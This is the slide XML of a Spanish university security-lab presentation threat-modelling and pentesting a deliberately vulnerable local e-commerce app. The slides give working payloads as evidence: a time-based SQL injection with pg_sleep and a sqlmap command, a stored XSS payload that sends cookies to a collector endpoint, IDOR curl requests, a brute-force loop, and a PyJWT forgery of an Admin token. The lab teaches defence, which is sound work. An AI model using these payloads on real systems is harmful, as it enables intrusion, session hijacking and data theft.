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· SEGURIDAD DE SOFTWARE ISW · LABORATORIO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🛡️  UNAPEC Mini Shop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D4A843"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Security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  <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Modelo de Amenazas · Análisis de Seguridad · Fase 1 (Red Team)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4846320"/>
            <a:ext cx="67052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·   Jose Canelo   ·   Rainiery Peña</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="800" b="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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· 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8132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Arquitectura de la Aplicación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75564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Stack tecnológico, roles y despliegue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945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468879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Entidades, flujos y límites de confianza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89504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2980944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07792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18211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10 amenazas identificadas y clasificadas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02736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694176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621024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Demostración de Vulnerabilidades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895344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5 ataques ejecutados con evidencia real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15968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40740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334256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Evidencia de Pentesting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60857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curl, sqlmap, PyJWT, OWASP ZAP — resultados reales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029200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4748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Puntuaciones CVSS v3.1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532180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Evaluación de severidad por hallazgo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742431"/>
            <a:ext cx="640080" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="round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1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760719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A1A2E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6035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C757D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Remediaciones para Fase 2 (Blue Team)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Arquitectura de la Aplicación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Stack tecnológico y configuración del laboratorio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⚙️  Servidor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ASP.NET Core 10 (Kestrel) — MVC/Razor + API Controllers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🗄️  Base de Datos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PostgreSQL 18 Alpine — 7 tablas, datos sintéticos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0896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🐳  Contenedor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Docker Compose — bind 127.0.0.1:5081, read-only, non-root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🔐  Auth MVC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Cookie LabSession — HttpOnly=false en Red Team (intencionalmente)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6634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🎫  Auth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98347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JWT Bearer HS256 — secreto débil 'MiniShopLab2026' (15 bytes)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👥  Roles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760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Cliente (4 cuentas) · Vendedor (1) · Admin (1)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="Picture 19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03520" cy="298323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00800" y="45720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C757D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Catálogo de productos — Vista pública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Diagrama de Flujo de Datos (DFD)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1 — Entidades, flujos de datos y límites de confianza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828800"/>
            <a:ext cx="2011680" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2C7BE5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74519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945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Usuario</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(Cliente/Vendedor/Admin)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54880" y="1828800"/>
            <a:ext cx="2560320" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="003366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1874519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⚙️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1945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ASP.NET Core</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>MVC/Razor + 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0" y="1828800"/>
            <a:ext cx="2286000" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2D6A4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1874519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🗄️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1945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PostgreSQL</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(Datos sintéticos)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2011680" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8E44A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886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Burp / ZAP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Herramientas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3840480"/>
            <a:ext cx="2286000" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6C757D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3886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  <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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2062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Logs</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(stdout contenedor)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645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→ HTTP, cookies,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7AE60"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>← HTML/JSON, cookie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645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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ EF Core/Npgsql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→ SQL raw (Red Team)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4114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C757D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ Logs 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114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E44AD"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ HTTP loopback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" y="502920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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>─ ─ ─  Trust Boundaries  ─ ─ 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TB-1: Navegador → App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Entrada no confiable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743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TB-2: Herramientas → App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loopback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TB-3: App → PostgreSQL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Límite proceso/datos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TB-4: /lab/collect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Flujo XSS cookie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601200" y="5394960"/>
            <a:ext cx="2103120" cy="64008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D4A8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544068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TB-5: Contenedor → Host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566928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A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Solo 127.0.0.1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31089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C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>↗ Cookie robada → /lab/collect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Modelo de Amenazas STRIDE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10 amenazas identificadas — todas las categorías cubiertas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508760"/>
            <a:ext cx="548640" cy="54864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Spoofing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Suplantación de identidad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S-01: Enumeración de usuarios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S-02: JWT débil → forjar Admin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1508760"/>
            <a:ext cx="548640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Tampering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Alteración de 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T-01: SQLi blind en búsqueda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51460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T-02: IDOR escritura en carrito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20" y="1508760"/>
            <a:ext cx="548640" cy="54864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15087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Repudiation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178308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Repudio de acciones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148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R-01: Sin tabla de auditoría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94360" y="4069080"/>
            <a:ext cx="548640" cy="54864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Info Disclosure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Divulgación de información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I-01: XSS + robo de cookie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0749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I-02: BOLA lectura de datos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44067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I-03: Enumeración login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E44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434840" y="4069080"/>
            <a:ext cx="548640" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect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Denial of Service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Denegación de servicio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D-01: Sin rate limit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3931920"/>
            <a:ext cx="356616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275320" y="4069080"/>
            <a:ext cx="548640" cy="54864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1148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61120" y="40690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t>Elev. of Privilege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4343400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C757D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Elevación de privilegios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47091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A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• E-01: Cookie/JWT → Admin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1: SQL Injection Blind Time-Based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VULN-01 · CWE-89 ·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9436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303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GET /api/products/search?q=&lt;payload&gt;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Enviar búsqueda normal → medir tiempo base (~0.005s)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2. Inyectar: q=no-match' OR (SELECT 1 FROM pg_sleep(2))=1 --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3. Medir tiempo de respuesta (~2.007s = +2.0s de retardo)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4. Confirmar con sqlmap: extraer nombre BD y tablas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📊 Resultados (DevTools Network)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Baseline:  4ms  →  Con pg_sleep(2):  2007ms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="1">
                <a:solidFill>
                  <a:srgbClr val="C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Diferencia: ~2003ms de retardo (inyección confirmada)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🛠️ Herramientas: curl + sqlmap v1.10.10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SQL raw con concatenación directa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del parámetro q usando rol minishop_search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0" y="1371600"/>
            <a:ext cx="48463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0" y="14173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78308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1-home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3200400"/>
            <a:ext cx="4846320" cy="27260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0" y="5029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Página de búsqueda — punto de inyección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F1-10 · SQL Injection — Evidencia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Timing manual (curl) + sqlmap confirmación automática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— Pentesting ejecutado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7AE60"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Timing Baseline (búsqueda normal)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548640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-s -o /dev/null -w '%{time_total}'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'http://127.0.0.1:5081/api/products/search?q=demo'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Intento 1:  0.031s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Intento 2:  0.058s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Intento 3:  0.040s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Promedio:   ~43ms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Inyección pg_sleep(2)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486400" cy="18288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73736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-s -o /dev/null -w '%{time_total}'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'...?q=demo'+AND+1=(SELECT+1+FROM+pg_sleep(2))--+-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Intento 1:  2.030s  ← +1987ms!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Intento 2:  2.065s  ← +2007ms!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Intento 3:  2.090s  ← +2050ms!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Promedio:   ~2062ms  (delta ~2019ms)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749039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sqlmap — Confirmación automática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114800"/>
            <a:ext cx="11247120" cy="20116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2062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sqlmap -u 'http://127.0.0.1:5081/api/products/search?q=demo'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-p q --dbms=PostgreSQL --technique=T --time-sec=2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--level=3 --risk=2 --prefix="'" --suffix="-- -" --batch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Parameter: q (GET)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  Type: time-based blind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Payload: q=demo' AND 7312=(SELECT 7312 FROM PG_SLEEP(2))-- -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--current-db → public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--tables → 8 tablas: CartItems, Carts, Comments, OrderItems,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           Orders, Products, Users, __EFMigrationsHistory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Herramientas: curl (timing manual) + sqlmap v1.10.10 (extracción automática)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2: XSS Almacenado + Robo de Cookie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VULN-02 · CWE-79 · OWASP A03:2021 Injection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POST /api/products/{id}/comments  +  GET /Products/Details/{id}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Cadena de ataque completa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Atacante (cliente-a) publica comentario malicioso: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&lt;img src=x onerror="fetch('/lab/collect?c='+...)"&gt;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El comentario se almacena sin sanitización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(@Html.Raw renderiza HTML crudo en modo Red Team)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Víctima (cliente-xss) visita /Products/Details/1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→ El JS inyectado ejecuta automáticamente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Cookie LabSession enviada a /lab/collect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GET /lab/collect?c=LabSession%3DCfDJ8... (HTTP 204)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5: Atacante replica cookie → suplanta sesión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GET /Account/Profile con cookie robada → ve 'cliente-xss'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@Html.Raw sin encoding + cookie sin HttpOnly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UI:R</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>S:C / C:H / I:N / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="05-product-detail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Detalle de producto con comentario XSS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F1-11 · XSS Almacenado — Evidencia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Cadena completa: payload → cookie theft → session replay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— Pentesting ejecutado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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Comentarios almacenados en producto 1 (via API)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11247120" cy="1188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GET /api/products/1/comments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  #1 (user:2): Comentario sintético de bienvenida.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  #2 (user:1): &lt;img src=x onerror=alert(1)&gt;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#3 (user:1): &lt;img src=x onerror="fetch('/lab/collect?c='+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              encodeURIComponent(document.cookie))"&gt;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71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@Html.Raw() renderiza HTML sin escapar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291840"/>
            <a:ext cx="5486400" cy="1097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3832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http://127.0.0.1:5081/Products/Details/1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| grep '&lt;img src=x'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&lt;img src=x onerror="fetch('/lab/collect?c='+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encodeURIComponent(document.cookie))"&gt;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29718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Cookie robada via /lab/collect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291840"/>
            <a:ext cx="5486400" cy="10972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383280"/>
            <a:ext cx="52120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# Víctima (cliente-xss) visita la página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# El onerror ejecuta fetch() automáticamente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GET /lab/collect?c=LabSession%3D[REDACTED]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HTTP 204 No Content (cookie exfiltrada)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663440"/>
            <a:ext cx="11247120" cy="13716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7548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Cadena de explotación verificada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Payload XSS almacenado via API (comentario #3)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2. @Html.Raw() lo renderiza como HTML real en el navegador</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>3. onerror → fetch('/lab/collect?c='+document.cookie) → HTTP 204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4. HttpOnly flag AUSENTE → JavaScript accede a document.cookie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63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Herramientas: curl (verificación) + simulación de víctima con cookie replay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3: IDOR / BOLA — Acceso No Autorizado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VULN-03 · CWE-639 · OWASP A01:2021 Broken Access Control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Endpoints afectados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/api/cart/{userId}  ·  /api/cart/{userId}/items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Login como cliente-a (sub=1) via /api/auth/login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IDOR Lectura — GET /api/cart/2 (carrito de B)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200: {userId:2, items:[Ratón demo, qty:5]}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IDOR Lectura — GET /api/cart/3 (carrito ADMIN)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200: {userId:3, items:[], total:0}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BOLA Escritura — POST /api/cart/2/items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201: carrito de otro usuario modificado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5: JWT forjado → GET /api/admin → HTTP 200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Lista completa de usuarios, productos y pedidos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Sin validación de ownership por recurso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UI:N</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>S:U / C:H / I:H / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="06-cart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Carrito — punto de acceso IDOR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F1-12 · IDOR/BOLA — Evidencia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cliente-a (sub=1) accede y modifica recursos de otros usuarios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— Pentesting ejecutado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IDOR Lectura — Carrito de cliente-b (userId=2)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0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-H 'Authorization: Bearer $JWT_A'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http://127.0.0.1:5081/api/cart/2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 200 OK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{id:2, userId:2, items:[{Ratón demo, qty:5,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priceCents:95000}], totalCents:475000}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IDOR Lectura — Carrito de admin-lab (userId=3)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548640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91640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-H 'Authorization: Bearer $JWT_A'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http://127.0.0.1:5081/api/cart/3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 200 OK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{id:3, userId:3, items:[], totalCents:0}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Datos del ADMIN accesibles!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461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BOLA Escritura — Modificar carrito ajeno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66160"/>
            <a:ext cx="11247120" cy="15544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-X POST -H 'Authorization: Bearer $JWT_A'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-H 'Content-Type: application/json'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  -d '{"productId":1,"quantity":5}'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http://127.0.0.1:5081/api/cart/2/items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 201 Created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{id:2, userId:2, items:[{Ratón demo,qty:5,95000}, {Teclado demo,qty:5,250000}],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totalCents:1725000}  ← Carrito de otro usuario MODIFICADO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349240"/>
            <a:ext cx="11247120" cy="9144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394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Sin validación de ownership en endpoints de carrito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El servidor acepta JWT válido pero NO verifica que sub=1 sea el dueño del recurso userId=2 o userId=3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CWE-639: Authorization Bypass Through User-Controlled Key · CWE-284: Improper Access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4: Autenticación Débil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VULN-04 · CWE-204/307 · OWASP A07:2021 Auth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POST /api/auth/login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Hallazgo A: Enumeración de usuarios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inexistente → "Usuario inexistente." (HTTP 401)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existente, pass mal → "Contraseña incorrecta." (401)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Mensajes DIFERENTES revelan qué cuentas existen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Hallazgo B: Timing Side-Channel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inexistente: respuesta en ~2.9ms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Usuario existente, pass mal: respuesta en ~3.8ms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Diferencia de timing confirma existencia de cuenta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Hallazgo C: Sin Rate Limiting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10 intentos consecutivos, ningún HTTP 429 ni bloqueo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Fuerza bruta viable sin restricciones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Mensajes diferenciados + sin rate limit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PR:N / UI:N</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>S:U / C:L / I:N / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="02-log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Página de login — punto de enumeración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F1-13 · Broken Auth — Evidencia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Enumeración de usuarios + timing side-channel + sin rate limiting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— Pentesting ejecutado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API: Usuario existente, contraseña incorrecta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00" cy="1188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-X POST /api/auth/login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  -d '{"username":"admin-lab","password":"WrongPwd!"}'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{"title":"Contraseña incorrecta.","status":401}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Mensaje revela que el usuario EXISTE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API: Usuario inexistente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5486400" cy="1188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916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-X POST /api/auth/login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  -d '{"username":"noexiste99","password":"WrongPwd!"}'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{"title":"Usuario inexistente.","status":401}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→ Mensaje DIFERENTE revela que NO existe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Brute force: 10 intentos sin rate limiting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80"/>
            <a:ext cx="5486400" cy="1188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for i in $(seq 1 10); do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  curl -s -o /dev/null -w '%{http_code}'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  -X POST /Account/Login -d 'Username=admin-lab'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done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#1:400 #2:400 #3:400 #4:400 #5:400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#6:400 #7:400 #8:400 #9:400 #10:400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Ningún 429 (Too Many Requests) = sin rate limit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30632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Timing side-channel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383280"/>
            <a:ext cx="5486400" cy="1188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347472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Usuario existente (admin-lab):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0.003198s  0.004570s  0.003672s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Promedio: ~3.8ms (hash bcrypt se computa)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Usuario inexistente (fake_user_xyz):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0.003614s  0.002684s  0.002452s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Promedio: ~2.9ms (retorno inmediato)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→ Diferencia observable (~1ms) confirma existencia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46320"/>
            <a:ext cx="11247120" cy="137160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8920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Triple canal de enumeración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1. CWE-204: Mensajes de error diferenciados revelan existencia de cuentas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2. CWE-208: Timing side-channel (~3.8ms vs ~2.9ms) confirma por tiempo de respuesta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3. CWE-307: Sin rate limiting — 10+ intentos sin bloqueo ni CAPTCHA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Un atacante puede enumerar usuarios válidos y realizar fuerza bruta sin restricción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Ataque 5: JWT HS256 Weak Secret — Escalación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VULN-05 · CWE-347/269 · OWASP A02:2021 Cryptographic Failures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713232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6675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📍 Endpoint afectado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/api/admin (Bearer JWT con role=Admin requerido)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🔬 Procedimiento del ataque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1: Login como cliente-a → obtener JWT legítimo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ Payload: {sub:'1', unique_name:'cliente-a', role:'Cliente'}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2: GET /api/admin con token original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HTTP 403 Forbidden (role=Cliente, necesita Admin)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3: Forjar token con PyJWT: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secret = b'MiniShopLab2026'.ljust(32, b'\x00')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payload = {..., role: 'Admin'}  # cambiar rol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jwt.encode(payload, secret, algorithm='HS256')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Paso 4: GET /api/admin con token forjado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→ HTTP 200 OK — acceso total a datos administrativos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ 5 usuarios, productos y pedidos expuestos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="6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⚠️ Causa raíz: Secreto HS256 de 15 bytes (débil + adivinable)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371600"/>
            <a:ext cx="365760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41732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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>CVSS v3.1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737360"/>
            <a:ext cx="1097280" cy="82296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7830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860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178308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Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>AV:N / AC:L / PR:L / UI:N</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>S:C / C:H / I:H / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="08-admin-n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0" y="3200400"/>
            <a:ext cx="3657600" cy="2057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046720" y="502920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C757D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Panel Admin — destino de la escalación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F1-14 · JWT Forgery — Evidencia Real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Escalación de privilegios: Cliente → Admin con secreto débil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— Pentesting ejecutado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Token legítimo (role=Cliente) → 403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00" cy="1188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JWT_A=$(curl -s -X POST /api/auth/login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-d '{"username":"cliente-a","password":"..."}' | jq -r .token)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-H "Authorization: Bearer $JWT_A"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http://127.0.0.1:5081/api/admin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HTTP 403 Forbidden  ← role=Cliente, acceso denegado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Token FORJADO (role=Admin) → 200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5486400" cy="118872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1691640"/>
            <a:ext cx="52120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python3 -c "import jwt,time;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
              <a:defRPr sz="900" b="0">
                <a:solidFill>
                  <a:srgbClr val="F1FA8C"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>  s=b'MiniShopLab2026'.ljust(32,b'\\x00');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t=jwt.encode({...,'role':'Admin','exp':...},s,'HS256');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  print(t)"</a:t>
            </a:r>
          </a:p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-H "Authorization: Bearer $JWT_FORGED" /api/admin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HTTP 200 OK  ← ACCESO ADMIN CONCEDIDO!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0632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C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Respuesta de /api/admin con token forjado — datos completos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83280"/>
            <a:ext cx="11247120" cy="137160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747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{"users": [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  {"id":1, "username":"cliente-a",    "role":"Cliente"},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  {"id":2, "username":"cliente-b",    "role":"Cliente"},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  {"id":3, "username":"cliente-xss",  "role":"Cliente"},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    {"id":4, "username":"cliente-brute","role":"Cliente"},</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
              <a:defRPr sz="900" b="0">
                <a:solidFill>
                  <a:srgbClr val="FF5555"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>    {"id":5, "username":"admin-lab",    "role":"Admin"} ← cuenta admin expuesta</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
              <a:defRPr sz="900" b="0">
                <a:solidFill>
                  <a:srgbClr val="F8F8F2"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>]}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0292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7AE60"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Control: secreto incorrecto → 401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49240"/>
            <a:ext cx="5486400" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E1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440679"/>
            <a:ext cx="521208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 b="0">
                <a:solidFill>
                  <a:srgbClr val="8BE9FD"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>$ curl -H 'Authorization: Bearer $JWT_BAD' /api/admin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
              <a:defRPr sz="900" b="0">
                <a:solidFill>
                  <a:srgbClr val="50FA7B"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>HTTP 401 Unauthorized  ← secreto inválido, rechazado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5029200"/>
            <a:ext cx="5486400" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDF5E6"/>
          </a:solidFill>
          <a:ln w="127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5074920"/>
            <a:ext cx="50292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C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Escalación de privilegios CONFIRMADA</a:t>
            </a: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403 (legítimo) → 200 (forjado) → 401 (control)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>CVSS 9.6 Critical — secreto de 15 bytes adivinable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Resumen de Puntuaciones CVSS v3.1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Evaluación de severidad de los 5 hallazgos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1005840" cy="64008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9.6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544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8745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JWT HS256 Weak Secret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858000" y="1737360"/>
            <a:ext cx="4389120" cy="2743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242316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514600"/>
            <a:ext cx="1005840" cy="64008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514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8.1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88036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25146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834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IDOR/BOLA Carrito/Pedidos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269748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2697480"/>
            <a:ext cx="370332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338328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47472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4747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6.8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84048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34747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794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XSS Almacenado + Cookie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0" y="365760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3657600"/>
            <a:ext cx="3108959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7200" y="434340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43484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434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480060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28800" y="4434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SQLi Blind Time-Based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58000" y="461772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0" y="461772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57200" y="5303520"/>
            <a:ext cx="1124712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0080" y="5394960"/>
            <a:ext cx="1005840" cy="64008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3949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  <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>5.3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576072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53949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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>VULN-04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A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Auth Débil (Enum + Brute)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58000" y="5577840"/>
            <a:ext cx="4572000" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E9EC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858000" y="5577840"/>
            <a:ext cx="2423160" cy="27432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57200" y="6309360"/>
            <a:ext cx="274320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CRITICAL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474720" y="6309360"/>
            <a:ext cx="2743200" cy="45720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1 HIGH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492240" y="6309360"/>
            <a:ext cx="27432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63550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t>3 MEDIUM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Demo de la Aplicación — UNAPEC Mini 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Capturas de las principales pantallas del sistema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="03-catalog-logged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303520" cy="298323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Catálogo autenticado</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="04-profile-n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371600"/>
            <a:ext cx="5303520" cy="29832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17920" y="34747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Perfil de usuario</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="08-admin-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931920"/>
            <a:ext cx="5303520" cy="29832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720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 administración</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Picture 12" descr="09-seller-n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3931920"/>
            <a:ext cx="5303520" cy="29832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17920" y="603504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6C757D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Panel del vendedor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OWASP ZAP — Scan Automatizado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Baseline scan contra http://127.0.0.1:5081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384048"/>
            <a:ext cx="3200400" cy="32004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0" y="40233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EVIDENCIA REAL — Pentesting ejecutado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71600"/>
            <a:ext cx="3200400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="round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59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PASS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31920" y="1371600"/>
            <a:ext cx="3200400" cy="9144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417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WARN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371600"/>
            <a:ext cx="3200400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DEE2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1417320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27AE60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7AE60"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>FAIL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2560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Alertas detectadas por ZAP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26080"/>
            <a:ext cx="685800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9443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Alerta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0" y="2926080"/>
            <a:ext cx="137160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0" y="29443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Severidad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926080"/>
            <a:ext cx="3017520" cy="36576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0" y="29443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Instancias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37560"/>
            <a:ext cx="68580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3558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Content Security Policy (CSP) Header Not Set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3337560"/>
            <a:ext cx="13716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452360" y="3374136"/>
            <a:ext cx="1097280" cy="246888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2360" y="337413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86800" y="3337560"/>
            <a:ext cx="301752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0" y="33558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Systemic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657600"/>
            <a:ext cx="6858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67588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Missing Anti-clickjacking Header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0" y="3657600"/>
            <a:ext cx="13716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452360" y="3694176"/>
            <a:ext cx="1097280" cy="246888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52360" y="369417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0" y="3657600"/>
            <a:ext cx="3017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367588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5 páginas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3977639"/>
            <a:ext cx="68580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399592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X-Content-Type-Options Header Missing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3977639"/>
            <a:ext cx="13716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52360" y="4014215"/>
            <a:ext cx="1097280" cy="24688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52360" y="4014215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3977639"/>
            <a:ext cx="301752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39959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Systemic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297679"/>
            <a:ext cx="6858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431596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Permissions Policy Header Not Set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0" y="4297679"/>
            <a:ext cx="13716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452360" y="4334255"/>
            <a:ext cx="1097280" cy="24688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452360" y="4334255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686800" y="4297679"/>
            <a:ext cx="3017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0" y="431596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Systemic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617720"/>
            <a:ext cx="68580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463600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Cross-Origin-Embedder-Policy Missing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15200" y="4617720"/>
            <a:ext cx="13716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452360" y="4654296"/>
            <a:ext cx="1097280" cy="24688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452360" y="465429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800" y="4617720"/>
            <a:ext cx="301752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86800" y="4636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4 endpoints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4937760"/>
            <a:ext cx="6858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495604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Cross-Origin-Opener-Policy Missing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315200" y="4937760"/>
            <a:ext cx="13716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452360" y="4974336"/>
            <a:ext cx="1097280" cy="24688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52360" y="497433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86800" y="4937760"/>
            <a:ext cx="3017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86800" y="4956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4 endpoints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5257800"/>
            <a:ext cx="68580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5276088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Cross-Origin-Resource-Policy Missing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315200" y="5257800"/>
            <a:ext cx="13716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452360" y="5294376"/>
            <a:ext cx="1097280" cy="246888"/>
